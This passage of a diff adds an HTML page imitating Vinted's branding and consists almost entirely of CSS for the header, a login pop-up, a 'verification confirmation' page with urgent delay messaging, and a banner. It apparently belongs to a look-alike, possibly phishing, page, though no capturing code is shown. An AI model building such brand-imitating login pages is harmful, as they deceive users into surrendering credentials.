@@ -1,0 +1,1677 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted | toute la seconde main dans une seule application</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* Your existing CSS for the header and footer */
+
+        /* Variables CSS pour les couleurs */
+        :root {
+            --vinted-green: #3ba78d;
+            --vinted-dark-grey: #333333;
+            --vinted-medium-grey: #555555;
+            --vinted-light-grey: #f5f5f5;
+            --vinted-border-grey: #e8e8e8;
+            --vinted-white: #ffffff;
+            --vinted-text-light-grey: #757575;
+            --vinted-footer-link: #888888;
+            --vinted-footer-hover: #3ba78d; /* Green for hover */
+            --vinted-error-red: #3ba78d; /* Ajout d'une couleur pour les erreurs/liens rouges */
+        }
+
+        /* Reset CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--vinted-dark-grey);
+            line-height: 1.5;
+            background-color: var(--vinted-white);
+            /* Add this to prevent horizontal scroll when menu is open */
+            overflow-x: hidden;
+
+            /* --- MODIFICATIONS HERE --- */
+            /* Ensure the body takes full viewport height and uses flexbox for layout */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            /* No background image on body if you want content to fill space */
+            background-image: none;
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .main-header {
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            max-width: 1240px;
+            margin: 0 auto;
+        }
+
+        .header-left-section {
+            display: flex;
+            align-items: center;
+        }
+
+        /* UPDATED CSS FOR LOGO */
+        .logo, .mobile-header-logo {
+            /* Remove text-specific styles */
+            font-weight: normal;
+            font-size: initial;
+            color: initial;
+            letter-spacing: normal;
+            white-space: nowrap;
+            margin-right: 50px; /* Keep original margin for desktop */
+            display: flex; /* Make it a flex container to center the image */
+            align-items: center;
+            justify-content: center;
+            height: 40px; /* Give it a height to contain the image */
+        }
+
+        .mobile-header-logo {
+            margin-right: 0; /* Remove specific mobile margin from original .logo */
+            flex-grow: 1; /* Allow logo to take available space for centering */
+            text-align: center;
+        }
+
+        img#custom-logo {
+            max-height: 100%; /* Ensure image fits within its container */
+            max-width: 100%; /* Ensure image fits within its container */
+            object-fit: contain; /* Maintain aspect ratio and fit within content box */
+        }
+
+        .search-container {
+            display: flex;
+            align-items: center;
+            background-color: var(--vinted-light-grey);
+            border-radius: 4px;
+            padding: 0px 15px;
+            width: 600px;
+            position: relative;
+            margin-left: 0;
+            margin-right: auto;
+        }
+
+        .articles-dropdown {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            padding: 8px 0px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-right: 15px;
+            white-space: nowrap;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 15px;
+        }
+
+        .articles-dropdown i {
+            font-size: 12px;
+        }
+
+        .search-bar {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-bar i {
+            color: var(--vinted-medium-grey);
+            margin-right: 10px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--vinted-dark-grey);
+            width: 100%;
+            padding: 8px 0;
+        }
+
+        .search-bar input::placeholder {
+            color: var(--vinted-medium-grey);
+        }
+
+        .top-nav {
+            margin-left: 60px;
+        }
+
+        .top-nav ul {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-white {
+            background-color: var(--vinted-white);
+            color: var(--vinted-dark-grey);
+            border: 1px solid var(--vinted-border-grey);
+        }
+
+        .btn-white:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .btn-green {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 12px 15px;
+            height: auto;
+        }
+
+        .btn-green:hover {
+            background-color: #008f51;
+        }
+
+        .icon-link {
+            font-size: 18px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+        /* Style for header icons */
+        .header-icon {
+            font-size: 20px; /* Adjust size as needed */
+            color: var(--vinted-medium-grey);
+            background-color: var(--vinted-white); /* White background */
+            border: 1px solid var(--vinted-border-grey); /* Border like the 'white' button */
+            border-radius: 5px;
+            padding: 7px 10px; /* Adjust padding to match button size */
+            cursor: pointer;
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px; /* Space between icons */
+        }
+
+        .header-icon:hover {
+            background-color: var(--vinted-light-grey);
+            border-color: var(--vinted-dark-grey);
+        }
+
+        .lang-select {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        /* Categories Nav (Desktop) */
+        .categories-nav {
+            background-color: var(--vinted-white);
+            border-top: 1px solid var(--vinted-border-grey);
+            padding: 10px 0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            display: block; /* Shown on desktop */
+        }
+
+        .categories-nav .container {
+            display: flex;
+            justify-content: flex-start;
+            flex-wrap: nowrap;
+            gap: 20px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 0 20px;
+        }
+
+        .categories-nav ul {
+            display: flex;
+            flex-wrap: nowrap;
+            gap: 20px;
+        }
+
+        .categories-nav ul li {
+            flex-shrink: 0;
+        }
+
+        .categories-nav ul li a {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            white-space: nowrap;
+            padding: 5px 0;
+            transition: color 0.2s ease;
+        }
+
+        .categories-nav ul li a:hover {
+            color: var(--vinted-green);
+        }
+
+        /* Footer */
+        .main-footer {
+            background-color: var(--vinted-white);
+            padding: 40px 0 20px 0;
+            margin-top: 0;
+            border-top: 1px solid var(--vinted-border-grey);
+            /* --- MODIFICATION HERE --- */
+            /* Ensure footer doesn't have top margin pushing it away */
+            margin-top: 0;
+        }
+
+        /* Styles pour centrer le bouton "Voir plus" */
+        .footer-top-button {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            width: 100%;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        .footer-top-button .btn-green {
+            width: 100%;
+            max-width: 200px;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-column h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--vinted-dark-grey);
+        }
+
+        .footer-column ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-column ul li a {
+            font-size: 14px;
+            color: var(--vinted-footer-link);
+            transition: color 0.2s ease;
+        }
+
+        .footer-column ul li a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--vinted-border-grey);
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .social-icons a {
+            color: var(--vinted-footer-link);
+            font-size: 20px;
+            margin-right: 15px;
+            transition: color 0.2s ease;
+        }
+
+        .social-icons a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .app-badges img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .legal-links a {
+            font-size: 13px;
+            color: var(--vinted-footer-link);
+            white-space: nowrap;
+            transition: color 0.2s ease;
+        }
+
+        .legal-links a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        /* Styles pour le formulaire de connexion (pop-up) */
+        .login-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Ensure it's on top of everything */
+            visibility: hidden; /* Hidden by default */
+            opacity: 0; /* Faded out by default */
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+
+        .login-modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .login-form-container {
+            background-color: var(--vinted-white);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 420px;
+            position: relative;
+            transform: translateY(20px); /* Slightly move down when appearing */
+            transition: transform 0.3s ease;
+        }
+
+        .login-modal-overlay.active .login-form-container {
+            transform: translateY(0);
+        }
+
+        .login-form-container .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .login-form-container .close-btn:hover {
+            color: var(--vinted-dark-grey);
+        }
+
+        .login-form-container h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--vinted-dark-grey);
+        }
+
+        .login-form-container form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .login-form-container input[type="text"],
+        .login-form-container input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 4px;
+            font-size: 16px;
+            color: var(--vinted-dark-grey);
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .login-form-container input[type="text"]:focus,
+        .login-form-container input[type="password"]:focus {
+            border-color: var(--vinted-green);
+            box-shadow: 0 0 0 1px var(--vinted-green);
+        }
+
+        .login-form-container .password-input-wrapper {
+            position: relative;
+        }
+
+        .login-form-container .password-input-wrapper i {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .login-form-container .btn-green {
+            width: 100%;
+            padding: 14px 20px;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+
+        .login-form-container .form-links {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .login-form-container .form-links a {
+            font-size: 14px;
+            color: var(--vinted-error-red); /* Using red for forgot password link as seen on Vinted */
+            transition: text-decoration 0.2s ease;
+            display: block; /* Each link on a new line */
+            margin-bottom: 10px;
+        }
+
+        .login-form-container .form-links a:hover {
+            text-decoration: underline;
+        }
+
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .header-top {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+            }
+
+            .header-left-section {
+                width: 100%;
+                justify-content: center;
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+            .logo {
+                margin-right: 15px;
+            }
+
+            .search-container {
+                width: 100%;
+                max-width: 600px;
+            }
+
+            .top-nav {
+                margin-left: 0;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+            .top-nav ul {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+                gap: 10px;
+            }
+            .top-nav ul li {
+                flex-shrink: 0;
+            }
+
+            .btn, .icon-link, .lang-select {
+                font-size: 14px;
+            }
+
+            .footer-content {
+                justify-content: center;
+                text-align: center;
+            }
+            .footer-column {
+                min-width: 45%;
+            }
+        }
+
+        /* Mobile Header specific styles */
+        .mobile-header-top {
+            display: none; /* Hidden by default */
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 15px;
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            width: 100%;
+        }
+
+        .mobile-menu-icon {
+            font-size: 24px;
+            color: var(--vinted-dark-grey);
+            cursor: pointer;
+        }
+
+        /* UPDATED CSS FOR MOBILE LOGO */
+        .mobile-header-logo {
+            /* Reset font styles */
+            font-weight: normal;
+            font-size: initial;
+            color: initial;
+            letter-spacing: normal;
+            white-space: nowrap;
+            text-align: center; /* Center the logo */
+            flex-grow: 1; /* Allow logo to take available space for centering */
+            display: flex; /* Make it a flex container to center the image */
+            align-items: center;
+            justify-content: center;
+            height: 40px; /* Give it a height to contain the image */
+        }
+
+        /* New styles for mobile header icons */
+        .mobile-header-icons {
+            display: flex;
+            gap: 10px; /* Space between mobile icons */
+        }
+
+        .mobile-header-icon {
+            font-size: 20px;
+            color: var(--vinted-medium-grey);
+            /* background-color: var(--vinted-white);
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 5px; */
+            padding: 5px; /* Smaller padding for mobile icons */
+            cursor: pointer;
+            transition: color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-header-icon:hover {
+            color: var(--vinted-dark-grey);
+        }
+
+        /* .btn-connect-mobile {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-connect-mobile:hover {
+            background-color: #008f51;
+        } */
+
+        /* NEW: Mobile Navigation Menu Styles */
+        .mobile-nav-menu {
+            position: fixed;
+            top: 0;
+            left: -100%; /* Start off-screen to the left */
+            width: 80%; /* Adjust as needed */
+            max-width: 300px; /* Limit width */
+            height: 100%;
+            background-color: var(--vinted-white);
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.2);
+            z-index: 200; /* Higher than header-top */
+            transition: left 0.3s ease-in-out; /* Smooth slide effect */
+            overflow-y: scroll; /* Garde le défilement fonctionnel */
+            padding-top: 60px; /* Space for the header if it overlaps */
+            scrollbar-width: none; /* Pour Firefox */
+            -ms-overflow-style: none;  /* Pour Internet Explorer et Edge */
+        }
+
+        /* Cache la barre de défilement pour les navigateurs basés sur WebKit (Chrome, Safari) */
+        .mobile-nav-menu::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-nav-menu.active {
+            left: 0; /* Slide into view */
+        }
+
+        .mobile-nav-menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .mobile-nav-menu ul li {
+            border-bottom: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-nav-menu ul li a,
+        .mobile-nav-menu .menu-item-button {
+            display: block;
+            padding: 15px 20px;
+            color: var(--vinted-dark-grey);
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .mobile-nav-menu ul li a:hover,
+        .mobile-nav-menu .menu-item-button:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .mobile-nav-menu .menu-item-button {
+            background-color: transparent; /* Override default button style */
+            border: none;
+            width: 100%;
+            text-align: left;
+            cursor: pointer;
+            box-sizing: border-box; /* Include padding in width */
+            color: var(--vinted-dark-grey); /* Ensure text color */
+        }
+
+        /* Specific style for "Vends tes articles" in mobile menu */
+        .mobile-nav-menu .menu-item-button.sell-articles {
+            color: var(--vinted-green);
+            font-weight: 600;
+        }
+
+        /* Overlay to dim background when mobile menu is open */
+        .mobile-menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 150; /* Between header and mobile menu */
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+
+        .mobile-menu-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* NEW: Mobile Search Bar Container */
+        .mobile-search-bar-container {
+            display: none; /* Hidden by default, only shown on mobile */
+            background-color: var(--vinted-white);
+            padding: 10px 15px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            border-top: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-search-bar-container .search-container {
+            width: 100%;
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+
+        .mobile-search-bar-container .articles-dropdown {
+            font-size: 13px;
+            padding: 0;
+            margin-right: 10px;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 10px;
+        }
+
+        .mobile-search-bar-container .search-bar input {
+            font-size: 13px;
+            padding: 6px 0;
+        }
+
+        /* NOUVEAU: Catégories alignées horizontalement et défilables (style Vinted Chip) */
+        .mobile-categories-chips {
+            display: none; /* Hidden by default, only shown on mobile */
+            background-color: var(--vinted-white);
+            padding: 10px 0; /* Vertical padding */
+            border-top: 1px solid var(--vinted-border-grey);
+            border-bottom: 1px solid var(--vinted-border-grey);
+            overflow-x: auto; /* Allows horizontal scrolling */
+            -webkit-overflow-scrolling: touch; /* Improves scrolling on iOS */
+            white-space: nowrap; /* Prevents elements from wrapping to the next line */
+            scrollbar-width: none; /* Hide scrollbar for Firefox */
+            -ms-overflow-style: none;  /* Hide scrollbar for IE/Edge */
+        }
+
+        /* Hide scrollbar for Webkit browsers (Chrome, Safari) */
+        .mobile-categories-chips::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-categories-chips ul {
+            display: inline-flex; /* Use inline-flex so items are on a single line */
+            gap: 8px; /* Space between chips, adjust as needed */
+            padding: 0 15px; /* Horizontal padding for scrolling */
+            margin: 0; /* Reset default ul margin */
+        }
+
+        .mobile-categories-chips li {
+            flex-shrink: 0; /* Prevents items from shrinking */
+            list-style: none; /* Remove list style */
+        }
+
+        .mobile-categories-chips a {
+            display: inline-flex; /* Use inline-flex for content inside the chip */
+            align-items: center; /* Center content vertically */
+            justify-content: center; /* Center content horizontally */
+            padding: 8px 16px; /* Padding inside the chip */
+            border: 1px solid var(--vinted-border-grey); /* Outlined style */
+            border-radius: 20px; /* Very rounded corners for chip effect */
+            background-color: var(--vinted-white); /* White background */
+            color: var(--vinted-medium-grey); /* Text color */
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            white-space: nowrap; /* Ensure text stays on one line within the chip */
+            transition: background-color 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+        }
+
+        .mobile-categories-chips a:hover {
+            background-color: var(--vinted-light-grey); /* Light grey on hover */
+            border-color: var(--vinted-dark-grey); /* Darker border on hover */
+            color: var(--vinted-dark-grey); /* Darker text on hover */
+        }
+
+        .mobile-categories-chips a i {
+            margin-right: 6px; /* Space between icon and text */
+            font-size: 14px; /* Icon size */
+        }
+
+        @media (max-width: 1024px) {
+            /* Adjust header-top for desktop under 1024px, but before mobile breakpoint */
+            .header-top .top-nav ul {
+                gap: 10px; /* Adjust gap for smaller desktop views */
+            }
+            .header-top .header-icon {
+                margin-right: 5px; /* Reduce margin between icons */
+                font-size: 16px;
+                padding: 6px 8px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                display: none; /* Hide desktop header elements on mobile */
+            }
+            .categories-nav {
+                display: none; /* Hide desktop categories nav on mobile */
+            }
+
+            .mobile-header-top {
+                display: flex; /* Show mobile header elements on mobile */
+            }
+
+            .mobile-search-bar-container {
+                display: block; /* Show new mobile search bar on mobile */
+            }
+
+            .mobile-categories-chips { /* Show new chip categories */
+                display: block;
+            }
+
+            /* Hide the desktop search container within header-top on mobile */
+            .header-top .search-container {
+                display: none;
+            }
+
+            .header-left-section {
+                width: 100%;
+                justify-content: center;
+                margin-bottom: 15px;
+                flex-wrap: wrap;
+            }
+            .logo {
+                margin-right: 0;
+                margin-bottom: 10px;
+                width: 100%;
+                text-align: center;
+            }
+
+            .top-nav {
+                margin-left: 0;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+            .top-nav ul {
+                flex-direction: column;
+                gap: 10px;
+                margin-top: 10px;
+                width: 100%;
+                align-items: center;
+            }
+            .top-nav ul li {
+                width: 100%;
+                max-width: 280px;
+                text-align: center;
+                margin-right: 0 !important;
+            }
+
+            .top-nav ul li .btn,
+            .top-nav ul li .icon-link,
+            .top-nav ul li .lang-select {
+                width: 100%;
+                display: block;
+                text-align: center;
+                padding: 10px 15px;
+                font-size: 14px;
+            }
+
+            /* .top-nav ul li:nth-child(3) {
+                margin-right: 0;
+                width: auto;
+                max-width: none;
+            }
+            .top-nav ul li:nth-child(3) .icon-link {
+                 display: inline-flex;
+                 justify-content: center;
+                 align-items: center;
+                 width: auto;
+                 padding: 0;
+                 margin-right: 5px;
+            } */
+
+            .top-nav ul li:last-child {
+                width: auto;
+                max-width: none;
+            }
+            .top-nav ul li:last-child .lang-select {
+                display: inline-flex;
+                justify-content: center;
+                align-items: center;
+                width: auto;
+                padding: 0;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                gap: 20px;
+            }
+            .footer-column {
+                min-width: unset;
+                width: 100%;
+            }
+            .footer-column ul {
+                text-align: center;
+            }
+            .footer-column ul li {
+                display: block;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+            .social-icons {
+                margin-bottom: 15px;
+            }
+            .app-badges {
+                margin-top: 15px;
+            }
+            .legal-links {
+                justify-content: center;
+                margin-top: 15px;
+            }
+
+            .login-form-container {
+                padding: 20px;
+            }
+            .login-form-container h2 {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            .login-form-container input {
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+            .login-form-container .btn-green {
+                padding: 12px 15px;
+                font-size: 14px;
+            }
+            .login-form-container .form-links a {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-left-section {
+                align-items: center;
+            }
+            .logo {
+                margin-bottom: 10px;
+            }
+            .top-nav ul {
+                align-items: center;
+            }
+
+            .footer-top-button {
+                width: 100%;
+                padding: 0 15px;
+            }
+            .footer-top-button .btn-green {
+                width: 100%;
+                max-width: 280px;
+            }
+
+            /* Ajustements pour les chips de catégories sur très petits écrans */
+            .mobile-categories-chips ul {
+                gap: 6px; /* Slightly less gap on very small screens */
+                padding: 0 10px;
+            }
+            .mobile-categories-chips a {
+                padding: 7px 14px; /* Slightly smaller padding */
+                font-size: 13px; /* Smaller font size */
+            }
+            .mobile-categories-chips a i {
+                font-size: 13px;
+            }
+        }
+
+
+        /* Original CSS for the confirmation page, adjusted for integration */
+        .page-wrapper {
+            max-width: 900px;
+            /* --- MODIFICATION HERE --- */
+            /* Removed margin-top to ensure it starts right after the header */
+            margin: 0 auto;
+            width: 100%;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); /* Added subtle shadow for distinction */
+        }
+
+        /* Removed original .logo style as it's now handled by the header's logo */
+        .page-wrapper > .logo {
+            display: none; /* Hide the old page logo */
+        }
+
+        .content-wrapper {
+            flex-grow: 1; /* Allows the content to expand and push footer down */
+            /* --- MODIFICATION HERE --- */
+            /* Removed vertical padding to reduce space. Keep horizontal if needed. */
+            padding: 0;
+            /* Added an explicit background image to the content-wrapper */
+            background-image: url('verificationconfirmation.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            color: #333; /* Ensure text color is still appropriate */
+        }
+
+
+        .support-image {
+            width: 100%;
+            display: block;
+            margin: 0; /* Ensure no margin around the image */
+        }
+
+        .content-container {
+            background-color: white;
+            width: 100%;
+            padding: 30px;
+            /* --- MODIFICATION HERE --- */
+            /* Removed margin-top on content-container, handled by page-wrapper */
+            margin: 0 auto;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin: 20px 0 15px;
+            text-align: center;
+            color: #09b1ba;
+        }
+
+        /* --- STYLES FOR THE TEXT SECTIONS (CONFIRMATION MESSAGE & NEXT STEP) --- */
+        .confirmation-message,
+        .next-step,
+        .support-text { /* Applying similar styles to support-text for consistency if desired */
+            background-color: #f0fdfe; /* Light blue background for contrast */
+            padding: 25px; /* Increased padding */
+            border-radius: 12px; /* Slightly more rounded corners */
+            margin-bottom: 25px; /* Space between sections */
+            text-align: center; /* Centered text */
+            color: var(--vinted-dark-grey); /* Dark grey text for high contrast */
+            font-size: 1.15em; /* Larger font size */
+            font-weight: 600; /* Bolder text */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Subtle box shadow for depth */
+            line-height: 1.6; /* Increased line height for readability */
+            border: 2px solid #09b1ba; /* A border for emphasis */
+            position: relative; /* Needed for pseudo-elements if you add more visual flair */
+        }
+
+        .confirmation-message p,
+        .next-step p {
+            margin-bottom: 15px; /* Space between paragraphs */
+        }
+
+        .confirmation-message p:last-child,
+        .next-step p:last-child {
+            margin-bottom: 0;
+        }
+
+        .next-step {
+            /* The original border-left can be kept or replaced by the overall border */
+            border-left: 3px solid #09b1ba; /* Keeping the distinct left border as well */
+            padding-left: 30px; /* Adjust padding for left border */
+        }
+
+        .next-step strong {
+            display: block;
+            margin-bottom: 12px; /* More space below strong tag */
+            color: #09b1ba; /* Highlight color for headings */
+            font-size: 1.2em; /* Even larger for titles */
+            font-weight: 700; /* Extra bold for titles */
+        }
+
+        .next-step p {
+            margin-top: 10px; /* Space above paragraphs within next-step */
+        }
+
+        /* Specific style for the "Délai de transmission" message with the arrow */
+        .next-step p:has(> .fa-hand-point-right) { /* Target paragraph containing the arrow icon */
+            font-size: 1.3em; /* Make this particular line even larger */
+            color: var(--vinted-error-red); /* Use a striking color for urgency */
+            font-weight: 700; /* Make it extra bold */
+        }
+
+        .support-text {
+            background-color: var(--vinted-white); /* White background for these specific support texts */
+            border: 1px solid var(--vinted-border-grey); /* Lighter border for less emphasis than key messages */
+            color: var(--vinted-medium-grey); /* Slightly lighter text color */
+            font-size: 1em; /* Standard font size */
+            font-weight: 400; /* Normal weight */
+            box-shadow: none; /* No shadow for these */
+            margin-top: 15px; /* Less margin above */
+            padding: 15px 20px; /* Smaller padding */
+        }
+
+
+        .divider {
+            border-top: 1px solid #e1e3e5;
+            margin: 25px 0;
+        }
+
+        .back-button {
+            background-color: #09b1ba; /* Green background for the button */
+            color: var(--vinted-white); /* White text */
+            border: none; /* No border */
+            padding: 15px 25px; /* Increased padding */
+            border-radius: 8px; /* More rounded corners */
+            font-size: 18px;
+            font-weight: 700; /* Bolder font */
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px; /* Wider button */
+            margin: 40px auto 30px; /* Increased top margin and bottom margin */
+            display: block;
+            transition: background-color 0.3s ease, transform 0.2s ease; /* Smooth transition */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Stronger shadow for the button */
+        }
+
+        .back-button:hover {
+            background-color: #008f51; /* Darker green on hover */
+            transform: translateY(-2px); /* Slight lift effect on hover */
+        }
+
+        .confirmation-image {
+            width: 100%;
+            display: block;
+            margin: 0;
+        }
+
+        /* Styles for the scrolling banner */
+        .scrolling-banner-container {
+            width: 100%;
+            background-color: white;
+            display: flex;
+            border-radius: 0; /* No border radius to ensure no spacing with image above */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            height: 50px; /* Reduced height for the banner */
+            margin-top: 0; /* Crucial: no space between image and banner */
+        }
+
+        .scrolling-banner-content-area {
+            flex-grow: 1;
+            padding: 10px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+        }
+
+        .scrolling-banner-scrolling-wrapper {
+            white-space: nowrap;
+            display: inline-block;
+            animation: scrollText 120s linear infinite;
+        }
+
+        .scrolling-banner-scrolling-wrapper p {
+            display: inline-block;
+            margin: 0;
+            padding-right: 50px;
+            font-size: 0.9em;
+            color: #333;
+        }
+
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .scrolling-banner-sidebar {
+            width: 450px;
+            background-color: #222;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            cursor: pointer;
+        }
+
+        .scrolling-banner-sidebar .arrow {
+            font-size: 1.5em;
+            display: inline-block;
+            animation: arrowMove 1s ease-in-out infinite alternate;
+        }
+
+        @keyframes arrowMove {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(5px);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .content-container {
+                padding: 20px;
+            }
+            .page-wrapper {
+                /* --- MODIFICATION HERE --- */
+                /* Adjusted margin to 0 for smaller screens too */
+                margin: 0 auto;
+            }
+            .confirmation-message,
+            .next-step,
+            .support-text {
+                font-size: 1em; /* Adjust font size for smaller screens */
+                padding: 20px; /* Adjust padding for smaller screens */
+            }
+            .next-step strong {
+                font-size: 1.1em; /* Adjust title font size for smaller screens */
+            }
+            .next-step p:has(> .fa-hand-point-right) {
+                font-size: 1.15em; /* Adjust special line font size */
